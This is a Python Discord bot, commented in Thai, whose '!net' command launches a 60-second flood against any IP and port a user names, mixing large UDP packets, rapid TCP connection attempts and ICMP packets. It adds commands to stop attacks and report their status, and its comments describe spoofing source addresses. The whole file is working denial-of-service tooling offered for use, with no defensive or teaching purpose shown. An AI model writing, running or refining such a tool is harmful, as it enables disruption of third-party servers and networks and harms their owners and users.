import discord
from discord.ext import commands
import asyncio
import socket
import random
import threading
import time
from datetime import datetime

TOKEN = 'DISCORD_TOKEN'

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# ตัวแปรควบคุมการโจมตี
active_attacks = {}

class AttackThread(threading.Thread):
    def __init__(self, target_ip, target_port, duration, speed):
        threading.Thread.__init__(self)
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.speed = speed
        self.running = True
        self.packets_sent = 0
        self.start_time = time.time()
        self.attack_id = f"{target_ip}:{target_port}"
        
    def stop(self):
        self.running = False
        
    def run(self):
        # สร้าง socket
        sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        # เปิดใช้งาน SO_REUSEADDR
        sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock_icmp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # ปลอมแปลง source IP (ใช้ random)
        fake_ips = [
            f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            f"192.168.{random.randint(0,255)}.{random.randint(0,255)}",
            f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(0,255)}"
        ]
        
        end_time = time.time() + self.duration
        
        # แพ็กเก็ตขนาดใหญ่
        payload_size = 65507  # Max UDP size
        payload = random._urandom(payload_size)
        
        # โจมตีหลายรูปแบบพร้อมกัน
        attack_methods = ['udp', 'tcp_syn', 'icmp']
        
        while self.running and time.time() < end_time:
            try:
                # เลือก method แบบสุ่มเพื่อเพิ่มประสิทธิภาพ
                method = random.choice(attack_methods)
                
                if method == 'udp':
                    # UDP Flood
                    for _ in range(self.speed // 3):
                        sock_udp.sendto(payload, (self.target_ip, self.target_port))
                        self.packets_sent += 1
                        
                elif method == 'tcp_syn':
                    # TCP SYN Flood (ปลอมแปลงแหล่งที่มา)
                    fake_ip = random.choice(fake_ips)
                    # สร้าง TCP SYN packet แบบง่ายๆ (ใช้ socket ดิบ)
                    try:
                        # ใช้ connect แบบปลอมแปลงไม่ได้ง่าย แต่เราจะส่ง SYN ด้วยการสร้าง raw packet
                        # แต่ให้ใช้การเชื่อมต่อแบบรวดเร็วแทน
                        sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock_tcp.settimeout(0.01)
                        sock_tcp.connect((self.target_ip, self.target_port))
                        sock_tcp.close()
                        self.packets_sent += 1
                    except:
                        pass
                        
                elif method == 'icmp':
                    # ICMP Flood (Ping of Death แบบย่อ)
                    try:
                        # สร้าง ICMP echo request ขนาดใหญ่
                        icmp_payload = random._urandom(1024)
                        sock_icmp.sendto(icmp_payload, (self.target_ip, 0))
                        self.packets_sent += 1
                    except:
                        pass
                
                # เพิ่มความเร็วด้วยการทำหลายเธรดย่อย
                # ใช้ sleep เล็กน้อยเพื่อไม่ให้ CPU เกิน
                if self.packets_sent % 1000 == 0:
                    time.sleep(0.001)
                    
            except Exception as e:
                pass
                
        # ปิด socket
        sock_udp.close()
        sock_tcp.close()
        sock_icmp.close()

@bot.event
async def on_ready():
    print(f'✅ บอทพร้อมใช้งานแล้ว!')
    print(f'📊 ชื่อบอท: {bot.user.name}')
    print(f'🆔 ID: {bot.user.id}')
    print(f'👥 เซิร์ฟเวอร์: {len(bot.guilds)}')
    print('='*50)
    print('🔥 ระบบพร้อมใช้งาน! พิมพ์ !net <IP> <PORT> <SPEED>')
    print('⚡ ตัวอย่าง: !net 10.215.173.1 39305 60')

@bot.command(name='net')
async def net_attack(ctx, ip: str, port: int, speed: int = 60):
    """!net <IP> <PORT> <SPEED> - โจมตีเป้าหมายด้วยความเร็วสูง"""
    
    # จำกัดความเร็วสูงสุด
    if speed > 60:
        speed = 60
    elif speed < 10:
        speed = 10
    
    # ตรวจสอบ IP และ Port
    if not ip or port < 1 or port > 65535:
        embed = discord.Embed(
            title="❌ ข้อมูลไม่ถูกต้อง!",
            description="IP หรือ Port ไม่ถูกต้อง\nใช้: !net <IP> <PORT> <SPEED>",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    attack_id = f"{ip}:{port}"
    
    # ถ้ากำลังโจมตีอยู่ ให้หยุดก่อน
    if attack_id in active_attacks:
        active_attacks[attack_id].stop()
        del active_attacks[attack_id]
        await ctx.send(f"🛑 หยุดการโจมตี {ip}:{port} แล้ว")
    
    # ตั้งค่าระยะเวลา (60 วินาที)
    duration = 60
    
    # สร้างเธรดโจมตี
    attack_thread = AttackThread(ip, port, duration, speed)
    active_attacks[attack_id] = attack_thread
    attack_thread.start()
    
    # สร้าง Embed แจ้งเตือน
    embed = discord.Embed(
        title="💥 กำลังโจมตีเป้าหมาย!",
        description=f"**IP:** `{ip}`\n**Port:** `{port}`\n**ความเร็ว:** `{speed}` แพ็กเก็ต/รอบ\n**ระยะเวลา:** `{duration}` วินาที",
        color=discord.Color.red()
    )
    embed.set_thumbnail(url="https://i.imgur.com/4MQIx5k.png")  # รูปการโจมตี
    embed.add_field(name="⚡ สถานะ", value="🔥 กำลังยิง...", inline=False)
    embed.add_field(name="📡 เป้าหมาย", value=f"`{ip}`", inline=True)
    embed.add_field(name="🔌 พอร์ต", value=f"`{port}`", inline=True)
    embed.add_field(name="⚔️ วิธีการ", value="UDP Flood + TCP SYN + ICMP", inline=False)
    embed.set_footer(text=f"เริ่มโจมตีเมื่อ: {datetime.now().strftime('%H:%M:%S')}")
    
    await ctx.send(embed=embed)
    
    # รอการโจมตีเสร็จ
    await asyncio.sleep(duration)
    
    # หยุดการโจมตี
    if attack_id in active_attacks:
        active_attacks[attack_id].stop()
        del active_attacks[attack_id]
        
        # สร้าง Embed รายงานผล
        result_embed = discord.Embed(
            title="✅ การโจมตีเสร็จสิ้น!",
            description=f"**IP:** `{ip}`\n**Port:** `{port}`\n**จำนวนแพ็กเก็ตที่ส่ง:** `{attack_thread.packets_sent:,}` แพ็กเก็ต",
            color=discord.Color.green()
        )
        result_embed.add_field(name="⏱️ ระยะเวลา", value=f"{duration} วินาที", inline=True)
        result_embed.add_field(name="📊 ความเร็วเฉลี่ย", value=f"{attack_thread.packets_sent // duration:,} แพ็กเก็ต/วินาที", inline=True)
        result_embed.set_footer(text=f"เสร็จสิ้นเมื่อ: {datetime.now().strftime('%H:%M:%S')}")
        
        await ctx.send(embed=result_embed)

@bot.command(name='stop')
async def stop_attack(ctx, ip: str = None, port: int = None):
    """หยุดการโจมตีที่กำลังทำงานอยู่"""
    if ip and port:
        attack_id = f"{ip}:{port}"
        if attack_id in active_attacks:
            active_attacks[attack_id].stop()
            del active_attacks[attack_id]
            await ctx.send(f"🛑 หยุดการโจมตี {ip}:{port} แล้ว")
        else:
            await ctx.send(f"❌ ไม่พบการโจมตีที่ {ip}:{port}")
    else:
        # หยุดทุกการโจมตี
        for attack_id in list(active_attacks.keys()):
            active_attacks[attack_id].stop()
            del active_attacks[attack_id]
        await ctx.send("🛑 หยุดการโจมตีทั้งหมดแล้ว")

@bot.command(name='status')
async def attack_status(ctx):
    """แสดงสถานะการโจมตีที่กำลังทำงาน"""
    if not active_attacks:
        await ctx.send("📭 ไม่มีการโจมตีกำลังทำงาน")
        return
    
    embed = discord.Embed(
        title="📊 สถานะการโจมตี",
        color=discord.Color.blue()
    )
    
    for attack_id, thread in active_attacks.items():
        elapsed = int(time.time() - thread.start_time)
        embed.add_field(
            name=f"🎯 {attack_id}",
            value=f"⏱️ เวลาที่ผ่านไป: {elapsed} วินาที\n📦 แพ็กเก็ตที่ส่ง: {thread.packets_sent:,}",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='ping')
async def ping_command(ctx):
    """เช็คสถานะบอท"""
    embed = discord.Embed(
        title="🏓 ปอง!",
        description=f"บอททำงานปกติ!\nLatency: `{round(bot.latency * 1000)}` ms",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

# ระบบกันบอทดับด้วยการทำ Keep-Alive
async def keep_alive():
    while True:
        await asyncio.sleep(30)
        print(f"💓 บอทยังมีชีวิตอยู่! {datetime.now().strftime('%H:%M:%S')}")

async def main():
    await bot.start(TOKEN)

if __name__ == "__main__":
    import asyncio
    loop = asyncio.get_event_loop()
    loop.create_task(keep_alive())
    loop.run_until_complete(main())